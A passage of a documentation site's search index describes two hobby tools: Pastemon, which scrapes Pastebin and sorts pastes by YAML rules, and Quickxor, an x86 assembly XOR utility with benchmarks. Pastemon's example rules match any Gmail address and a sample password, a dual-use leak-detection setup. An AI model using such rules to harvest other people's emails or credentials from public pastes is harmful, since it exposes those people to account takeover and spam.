scrapping interface provided by Pastebin. In order to use it, you should whitelist your IP. Therefore, to use Pastemon, you should have a PRO account in Pastebin, otherwise your IP will be blocked after a few seconds. The necessary libraries in order to run this tool, are written down in the requirements.txt .","title":"Requirements"},{"location":"tiny_tools/pastemon/#install","text":"To install the tools and necessary libraries, it's recommended to use a particular virtual env: virtualenv pastemon -p python3 source pastemon/bin/activate cd pastemon pip install -r requirements.txt python pastemon.py ARGUMENTS","title":"Install"},{"location":"tiny_tools/pastemon/#how-to-use-it","text":"usage: pastemon.py [-h] [-d DOWNLOADERS] [-g GETTERS] [-a ANALYZERS] [-s STORERS] [-r ANALYSIS_DIR_PATH] [-o OUTPUT_DIR_PATH] [-c CONDITIONS_FILE_PATH] [-t TIME_TO_WAIT] [-n AMOUNT_OF_PASTES_TO_FETCH] optional arguments: -h, --help show this help message and exit -d DOWNLOADERS Amount of downloaders (will download the pastebin content) -g GETTERS Amount of getters (will check for new pastebins) -a ANALYZERS Amount of analyzers (will analyze the pastebins content) -s STORERS Amount of storers (will either store or delete a pastebin) -r ANALYSIS_DIR_PATH Path to store the pastes to be analyzed (temporary) -o OUTPUT_DIR_PATH Path to store the pastes that accomplished some condition -c CONDITIONS_FILE_PATH Path to the YAML conditions file -t TIME_TO_WAIT Amount of time (in secs) to wait between each time it goes for new pastes. Suggested and default (180) -n AMOUNT_OF_PASTES_TO_FETCH Amount of pastes to fetch each time it goes for new pastes. Maximun and default is 250","title":"How to use it"},{"location":"tiny_tools/pastemon/#how-does-it-work","text":"If you are interested in the full architecture of the tool, here you'll find a detailed description: As it is depicted in the picture, there are several components involves in the framework: Pastebin Server : This is the only thing that is not controlled by the user. It represents the host where the pastebins are uploaded. Redis : A redis instance with couple of queues to deal with the async between several processes. Storage : This is any storage chosen by the user, used to store each pastebin either temporary or definitively (if it matches some rule). Pastebin Monitor : The actual and initial Python script (pastemon.py) which received the arguments to configure the whole tool. Conditions definition file : A .yaml file where the rules/conditions are defined. Orchestrator : Naive Python object in charge of initializing the rest objects and validating the input. Getters : Python objects in charge of pulling ONLY the new pastes (if there are) and pushing the data related to them (URL, name, etc) to the Pastes data queue . Downloaders : Python objects in charge of pulling the corresponding data of each new pastebin from the pastes data queue , to later download the actual content of each of them. Once the contest is downloaded, it is stored in the Storage (in particular in the Analysis Directory , flag -r ), the related info (path to the storage) is pushed to the Pastes to analyze queue . Analyzers : Python objects in charge of analyzing the actual content (after getting the path from the Pastes to analyze queue ). If there is rule that matches, the path to it togeteher with the action that should be carried out (either store it or delete it) is pushed to the Storers queue . Storers : Python objects in charge of either deleting the patebins that didn't match or moving them in the corresponding directory. For each condition/rule defined a directory, inside the output directory provided as parameter, is created.","title":"How does it work"},{"location":"tiny_tools/pastemon/#defining-rules-conditions","text":"In order to write new rules/conditions to be matched, a .yaml file with the following structure should be provided: [cond1]: [match_cond_1_1] [match_cond_1_2] ... [cond2]: [match_cond_2_1] [match_cond_2_2] ... ... [condn]: [match_cond_n_1] [match_cond_n_2] ... [condX] : Will be used as the name of the rule/condition, therefore it will exist a directory with this name where all the matched pastebins will be placed. [match_cond_X_Y] : WIll be each of the parts of the condition that are going to be actually checked. The list of possible parameters up to date are: regex : If you want to match some regex. (Only one per condition, can't be used with string in the same condition) string : If you want to match a fixed string. (Only one per condition, can't be used with regex in the same condition) icase : True or False. If True, the match is case insensitive. By default, is False. times : A Natural number. Amount of time that the string/regex should match. By default, 1. Take into account that backslashes \"\\\" must be escaped!!!!! Besides the framework itself, a separate script called tester.py is shipped. This script allows you to manually/quick understand against which conditions/rules a certain \"pastebin\" will match: python tester.py -c test.yaml -p test.pastebin To see a complete example, head to the next section","title":"Defining rules / conditions"},{"location":"tiny_tools/pastemon/#example","text":"python pastemon.py -r analysis -o output -c example.yaml any_gmail_email: regex: \"[^@\\\\s]+@gmail.com\" icase: True my_name: string: \"lmkalg\" icase: True times: 5 my_password: string: \"34syP4ssW0rd1234\" Deeper description: The first condition named \"any_gmail_email\" will match only when the an email of the gmail domain (no matter the case) is present in the pastebin. In positive case, it will store the pastebin inside the output/any_gmail_email/ directory. The second condition named \"my_name\" will match only when the string \"lmkalg\" (no matter the case) is present more than 5 times inside the pastebin. In positive case, it will store the pastebin inside the output/my_name/ directory. The third and last condition named \"my_password\" will match only when the string \"34syP4ssW0rd1234\" appears in the pastebin exactly with the same case each letter. If only one of them differs, the match won't occur. In positive case, it will store the pastebin inside the output/my_password/ directory.","title":"Example"},{"location":"tiny_tools/pastemon/#future-work","text":"Be able to match more than one string/regex in the same condition (near future) Be able to monitor by user. Extend not only to pastebin, but also to another sources.","title":"Future work"},{"location":"tiny_tools/quickxor/","text":"Quickxor Description Quickxor is an assembly x86 written tool that performs XOR between two files. It was developed with two goals: Make the XOR much faster than usual tools Make fun during the journey (yes, I like developing in assembler ;) ) Quickxor makes use of XMM registers, which allows to operate with 16 bytes at the same time. Source code The source code can be found here , together with a set of tools for benchmarking against custom tools. How it works Quickxor is able to perform XOR between any file of arbitrary size (tested up to 4GB) and a key of maximum 16 bytes. The reason of the latter condition is the main way it works. Byte by byte xoring Let's suppose that we want to XOR a file of 2GB against a key of 2 bytes. If we were coding in Python or even in C we will do that byte by byte. For example: unsigned int i; for(i=0; i < file_len; i++){ result_buffer[i] = key_buffer[i%key_len] ^ file_buffer[i]; } If we compile a program that performs this (even with -O2 GCC flag), the assembly code created will be: This was compiled with gcc version 9.2.1 20191102 As you can quickly see the xor line is using the register al which means that it is being carried out byte by byte. Furthermore, this implies that for each byte, it will have to access memory, meaning a lot of accesses!. Faster way of xoring? Quickxor tries to decrease the amount of accesses by operating with several bytes at the same time. ;xmm2 holds the super key mov xmm1, [ptr_file] ; Reading 16 bytes from the file pxor xmm1, xmm2 ; Xor 16 bytes at once. But the question is.. How we build xmm2? Let's see.. if we have a key of 2 bytes... and registers up to 16 bytes. We can make fit the key 8 times inside the register and then perform 16 XOR's in one instruction! At the very beginning, Quickxor will create a \"super key\": an XMM register with the maximum number of times that the key fixes inside it. These are the possible cases: Key length # times it fits # of bytes 1 16 16 2 8 16 3 5 15 4 4 16 5 3 15 6 2 12 7 2 14 8 2 16 9 1 9 10 1 10 11 1 11 12 1 12 13 1 13 14 1 14 15 1 15 16 1 16 Reading the table we can infer that, in the worst case scenario, Quickxor will operate with 9 bytes at the same time. Which means that is much faster than the afore showed naive tool (9x?) General operation To perform such thing, Quickxor first defines the number of: Number of rounds: Number of times that we will have to perform a xor (except last round) Number of bytes that will be xored in each round: Based on the key (what the previous table shows) Number of bytes that will have to be xored in the last round: This have to be treated differently. If we are working with a file of size 22 bytes with a key of 9: Will be 22/9 (entire division) = 2 Will be 9 (according to table) 22%9 = 4. In other words, this means that Quickxor will perform 2 rounds of Xoring 9 bytes, and then separately, will xor 4 bytes. The last part is the most difficult and that's the reason why it should be treated differently. Quickxor should and do care about invalid read/write access. Performing and out of bounds read/write may cause a segmentation fault in the program. That was why the last part is performed reading and writing byte by byte. Maybe it sounds easy and clear, but it wasn't.. at least for me... Ensure avoiding invalid read/write access When we operate byte by byte, it's easy to have control of the boundaries. But.. what happens when we want to read 16 bytes at once? During my journey I faced an issue that wasn't easy to catch: Let's use the same example as before: a file of size 22 bytes with a key of 9. One of the Quickxor main cycles was in charge of detecting when it was time to jump the last round (byte by byte xoring). The following pseudo-code tries to depict it: while (number_of_leftover_bytes < number_of_bytes_to_xor_by_round){ grab_16_bytes_from_file() xor_number_of_bytes() write_xor_result_to_result_buffer() number_of_leftover_bytes -= number_of_bytes_to_xor_by_round } Maybe somebody can spot the error very fast (also because in pseudo code or even in C may be easier). I can assure you that in the assembly code was not that easy. Let's apply our example to find the error. After the first round, the number_of_leftover_bytes will be 13 (22-9), meaning that the condition will be accomplish successfully and a second round of the cycle will be executed. However, the pointer to the file is just 13 bytes far from the end. When the first function of the cycle is performed, we will try to read 16 bytes and an invalid read will be executed (by 3 bytes in this case). This type of issues weren't easy to spot. That's why I developed a set of (functional and memory) tests to ensure that every change in the assembly code doesn't break anything. Benchmark results While developing Quickxor, I wanted to test that what I thought in theory was actually working (xoring multiple bytes in one intruction was faster than byte by byte). So, I developed a simple C script that performs a byte by byte xor. Its code can be found in the repository as well. Together with this tool, I developed a kind of framework, that allows you compare the speed of Quickxor against any tool of your preference (for more info refer to the README.md). In this section I'll show the output of this framework using both tool developed: Quickxor, and my C version called xor_in_c (very original). (both tools have the source code, except for the part that actually performs the xor). Disclaimer: All tests were performed in the same machine. xor_in_c was compiled using \"-O2\" . As we can see clearly in this graph, the curve for xor_in_c is much steeper, and increases almost in a linearly. While Quickxor has a smoother curve. The difference between times is easy spottable and allows to quickly understand which one operates faster. I hope you enjoy the tool. Feel free to send me back some feedback and to propose improvements! @lmkalg.","title":"Quickxor"},{"location":"tiny_tools/quickxor/#quickxor","text":"","title":"Quickxor"},{"location":"tiny_tools/quickxor/#description","text":"Quickxor is an assembly x86 written tool that performs XOR between two files. It was developed with two goals: Make the XOR much faster than usual tools Make fun during the journey (yes, I like developing in assembler ;) ) Quickxor makes use of XMM registers, which allows to operate with 16 bytes at the same time.","title":"Description"},{"location":"tiny_tools/quickxor/#source-code","text":"The source code can be found here , together with a set of tools for benchmarking against custom tools.","title":"Source code"},{"location":"tiny_tools/quickxor/#how-it-works","text":"Quickxor is able to perform XOR between any file of arbitrary size (tested up to 4GB) and a key of maximum 16 bytes. The reason of the latter condition is the main way it works.","title":"How it works"},{"location":"tiny_tools/quickxor/#byte-by-byte-xoring","text":"Let's suppose that we want to XOR a file of 2GB against a key of 2 bytes. If we were coding in Python or even in C we will do that byte by byte. For example: unsigned int i; for(i=0; i < file_len; i++){ result_buffer[i] = key_buffer[i%key_len] ^ file_buffer[i]; } If we compile a program that performs this (even with -O2 GCC flag), the assembly code created will be: This was compiled with gcc version 9.2.1 20191102 As you can quickly see the xor line is using the register al which means that it is being carried out byte by byte. Furthermore, this implies that for each byte, it will have to access memory, meaning a lot of accesses!.","title":"Byte by byte xoring"},{"location":"tiny_tools/quickxor/#faster-way-of-xoring","text":"Quickxor tries to decrease the amount of accesses by operating with several bytes at the same time. ;xmm2 holds the super key mov xmm1, [ptr_file] ; Reading 16 bytes from the file pxor xmm1, xmm2 ; Xor 16 bytes at once. But the question is.. How we build xmm2? Let's see.. if we have a key of 2 bytes... and registers up to 16 bytes. We can make fit the key 8 times inside the register and then perform 16 XOR's in one instruction! At the very beginning, Quickxor will create a \"super key\": an XMM register with the maximum number of times that the key fixes inside it. These are the possible cases: Key length # times it fits # of bytes 1 16 16 2 8 16 3 5 15 4 4 16 5 3 15 6 2 12 7 2 14 8 2 16 9 1 9 10 1 10 11 1 11 12 1 12 13 1 13 14 1 14 15 1 15 16 1 16 Reading the table we can infer that, in the worst case scenario, Quickxor will operate with 9 bytes at the same time. Which means that is much faster than the afore showed naive tool (9x?)","title":"Faster way of xoring?"},{"location":"tiny_tools/quickxor/#general-operation","text":"To perform such thing, Quickxor first defines the number of: Number of rounds: Number of times that we will have to perform a xor (except last round) Number of bytes that will be xored in each round: Based on the key (what the previous table shows) Number of bytes that will have to be xored in the last round: This have to be treated differently. If we are working with a file of size 22 bytes with a key of 9: Will be 22/9 (entire division) = 2 Will be 9 (according to table) 22%9 = 4. In other words, this means that Quickxor will perform 2 rounds of Xoring 9 bytes, and then separately, will xor 4 bytes. The last part is the most difficult and that's the reason why it should be treated differently. Quickxor should and do care about invalid read/write access. Performing and out of bounds read/write may cause a segmentation fault in the program. That was why the last part is performed reading and writing byte by byte. Maybe it sounds easy and clear, but it wasn't.. at least for me...","title":"General operation"},{"location":"tiny_tools/quickxor/#ensure-avoiding-invalid-readwrite-access","text":"When we operate byte by byte, it's easy to have control of the boundaries. But.. what happens when we want to read 16 bytes at once? During my journey I faced an issue that wasn't easy to catch: Let's use the same example as before: a file of size 22 bytes with a key of 9. One of the Quickxor main cycles was in charge of detecting when it was time to jump the last round (byte by byte xoring). The following pseudo-code tries to depict it: while (number_of_leftover_bytes < number_of_bytes_to_xor_by_round){ grab_16_bytes_from_file() xor_number_of_bytes() write_xor_result_to_result_buffer() number_of_leftover_bytes -= number_of_bytes_to_xor_by_round } Maybe somebody can spot the error very fast (also because in pseudo code or even in C may be easier). I can assure you that in the assembly code was not that easy. Let's apply our example to find the error. After the first round, the number_of_leftover_bytes will be 13 (22-9), meaning that the condition will be accomplish successfully and a second round of the cycle will be executed. However, the pointer to the file is just 13 bytes far from the end. When the first function of the cycle is performed, we will try to read 16 bytes and an invalid read will be executed (by 3 bytes in this case). This type of issues weren't easy to spot. That's why I developed a set of (functional and memory) tests to ensure that every change in the assembly code doesn't break anything.","title":"Ensure avoiding invalid read/write access"},{"location":"tiny_tools/quickxor/#benchmark-results","text":"While developing Quickxor, I wanted to test that what I thought in theory was actually working (xoring multiple bytes in one intruction was faster than byte by byte). So, I developed a simple C script that performs a byte by byte xor. Its code can be found in the repository as well. Together with this tool, I developed a kind of framework, that allows you compare the speed of Quickxor against any tool of your preference (for more info refer to the README.md). In this section I'll show the output of this framework using both tool developed: Quickxor, and my C version called xor_in_c (very original). (both tools have the source code, except for the part that actually performs the xor). Disclaimer: All tests were performed in the same machine. xor_in_c was compiled using \"-O2\" . As we can see clearly in this graph, the curve for xor_in_c is much steeper, and increases almost in a linearly. While Quickxor has a smoother curve. The difference between times is easy spottable and allows to quickly understand which one operates faster. I hope you enjoy the tool. Feel free to send me back some feedback and to propose improvements! @lmkalg.","title":"Benchmark results"}]}